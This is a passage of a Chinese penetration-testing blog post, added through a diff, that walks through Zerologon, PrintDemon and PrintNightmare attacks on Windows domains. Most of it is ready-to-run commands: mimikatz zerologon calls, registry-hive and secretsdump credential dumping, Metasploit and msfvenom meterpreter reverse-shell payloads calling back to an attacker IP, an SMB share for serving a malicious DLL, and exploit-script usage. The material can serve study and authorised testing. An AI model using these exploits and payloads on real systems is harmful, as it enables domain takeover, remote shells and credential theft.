+pyinstaller -F cve-2020-1472-exploit.py 
+pyinstaller -F secretsdump.py
+</code></pre>
+<p>执行完毕之后可以在当前目录的dist下面找到有.py打包的.exe文件(exploite生成的exe文件会被defender直接杀掉,但是secretsdump生成的exe就没问题)</p>
+<p>此外也可以使用mimikatz直接进行攻击(有些mimikatz版本没有zerologon模块,可以到这里下载mimikatz_trunk.zip:<br>
+<code>https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919</code></p>
+<pre><code>mimikatz.exe &quot;lsadump::zerologon /target:192.168.30.10 /ntlm /null /account:DC$/exploite&quot; exit
+</code></pre>
+<p><code>恢复域控密码:</code></p>
+<p>https://blog.csdn.net/Captain_RB/article/details/120643838</p>
+<p>在攻击结束之后需要及时恢复域控的密码, 否则可能导致域控制器脱域。主要原因是域控NTDS.dit中存储的密码和域控本地注册表中存储的密码不一致</p>
+<p>导出注册表（使用注册表中的哈希还原之前被制空的哈希）：</p>
+<pre><code>reg save HKLM\SYSTEM system.hiv
+reg save HKLM\SAM sam.hiv
+reg save HKLM\SECURITY security.hiv
+</code></pre>
+<p>导出后复制到本地, 使用secretsdump.py导出注册表中的哈希值,重置机器前的机器用户密码(密码前面有plain_password_hex:,显示的是HEX编码后的结果)</p>
+<pre><code>python3 secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1681279262586.png" alt="" loading="lazy"></figure>
+<pre><code>python3 restorepassword.py god.org/owa@owa -target-ip 192.168.52.138 -hexpass 5492e8fdaeef13b8bad98df923afb2616287275ad52f8477f49340f426019a0b74fa9b3029ce32c4a6dfa9936376a974c00e519e3b20f1788478ea1e4a361d7eff8edce69a07b257ed0c2a69aa4cb100bffaf8d2779b81f1a91d6cd438a021c831546186f16ddb4d433df1f79ad6af813587ef9ec3243cd8b837c840f953828d1aa3ce569ad082ceada22e053ea0fd918cba162bfdeb9f16dfe90f551bcf55534aa11e060e77bb32dce728d09616abe1a7c633e40965067d1e9c59393435aa2fa6fce275c695de4d4826ae8a8bcbafdcd73bba9463f4a931c83f5f42dad95008b697cbc0407c104c12324b21fd6af8c3
+
+Mimikatz：
+lsadump::postzerologon /traget:god.org /account:owa$
+
+</code></pre>
+<p><img src="https://dydydy123.github.io/post-images/1681281304228.png" alt="" loading="lazy"><br>
+执行成功后再次链接失败：<br>
+<img src="https://dydydy123.github.io/post-images/1681281313758.png" alt="" loading="lazy"></p>
+<h1 id="9print-spooler提权漏洞">9.Print Spooler提权漏洞</h1>
+<p><strong>9.1 PrintDemon</strong><br>
+2020年5月12日更新安全补丁，公开了PrintDemon本地提权漏洞(CVE-2020-1048)</p>
+<p>在Windwos添加打印机是需要设置打印机的端口,如LPT1端口、USB端口、网络端口和文件等。如果端口设置为文件路径，那么打印的内容就会被输出到文件。</p>
+<p>这个漏洞简单来说就是如果在标准用户权限下进行打印服务，将数据打印到指定的系统文件中，如果权限不足就会打印失败。</p>
+<p>而微软为了应对打印过程的异常和中断，引入了假脱机打印机制。</p>
+<p>假脱机打印会在系统重启后使用SYSTEM权限恢复之前未执行完的打印任务，这时候如果指定端口为文件，就会导致任意文件写入。</p>
+<p>所以通过介绍了解PrintDemon漏洞可以做什么了–任意文件写入,那么怎么通过这个进一步完成RCE呢?</p>
+<p>1.DLL劫持文件写入<br>
+2.系统SYSTEM权限自启任务的exe文件替换(教程中就是直接替换了TestSvc服务的二进制文件)<br>
+3.个人思维拓展: 之前看注册表的时候有发现每个注册表都是一个文件, 那么是不是可以通过文件修改直接修改注册表完成服务的注册表劫持从而加载恶意payload拿到SYSTEM的会话</p>
+<p><code>Invoke-PrintDemon.psl利用：</code></p>
+<pre><code>Import-Module .\Invoke-PrintDemon.psl
+
+Invoke-PrintDemon -PrinterName '指定创建的打印机名称' -Portname 'C:\??\name.exe' -Base64code '&lt;PayloadBase64&gt;'
+
+PayloadBase64：
+https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')
+</code></pre>
+<p><code>msf利用：</code></p>
+<pre><code>use /windows/local/cve_2020_1048_printerdemo 
+
+set session 1
+set verbose true
+set restart_target true
+set payload windows/x64/meterpreter/reverse_tcp
+set disablepayloadhandler false
+set lhost 192.168.52.138
+set lport 4444
+run
+</code></pre>
+<p><strong>9.2 PrintNightmare</strong><br>
+PrintNightmare有两种变体,一种是权限提升(CVE-2021-1675,2021年6月8日推出微软补丁), 另一种允许远程代码执行(CVE-2021-34527,在1675补丁发布后爆出)</p>
+<p>标准用户可以通过PrintNightMare漏洞绕过PfcAddPrinterDriver的安全验证并在打印服务器中安装恶意的驱动程序(如果当前所控制用户在域中那么可以连接到DC PrintSpooler服务中安装的恶意驱动从而接管整个域)。</p>
+<p><code>1.CVE-2021-1675</code><br>
+https://github.com/cube0x0/CVE-2021-1675<br>
+SharpPrintNightMare.exe需编译：</p>
+<pre><code>SharpPrintNightMare.exe C:\temp\reverse_http_80.dll
+</code></pre>
+<p><code>2.CVE-2021-34527</code><br>
+先使用msfvenom生成dllpayload，并开启监听。</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.92.128 LPORT=80 -f dll -o /tmp/123.dll
+
+监听需设置：
+set AutoRunScript migrate -f
+</code></pre>
+<p>kali中开启smb服务,SMB服务配置文件/etc/samba/smb.conf修改为如下内容:</p>
+<pre><code>[global]
+map to guest = Bad User
+server role = standalone server
+usershare allow guests = yes
+idmap config * : backend = tdb
+smb ports = 445
+ 
+[smb]
+comment = Samba
+path = /tmp/
+guest ok = yes
+read only = no
+browsable = yes
+</code></pre>
+<pre><code>开启服务：
+service smbd start
+
+域内被控制主机查看smb服务开启情况
+dir \\192.168.52.132\smb
+</code></pre>
+<pre><code>└─# python3 CVE-2021-1675.py                                      
+usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share [pDriverPath]
+
+MS-PAR PrintNightmare CVE-2021-1675 / CVE-2021-34527 implementation.
+
+positional arguments:
+  target                [[domain/]username[:password]@]&lt;targetName or address&gt;
+  share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll'
+  pDriverPath           Driver path. Example 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL'
+
+optional arguments:
+  -h, --help            show this help message and exit
+
+authentication:
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is LMHASH:NTHASH
+
+connection:
+  -target-ip ip address
+                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
+  -port [destination port]
+                        Destination port to connect to SMB Server
+
+Example;
+./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
+./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL'
+
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-duan-kou-zhuan-fa-yu-nei-wang-dai-li/">
+                  <h3 class="post-title">
+                    内网渗透体系建设--第3章--端口转发与内网代理
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
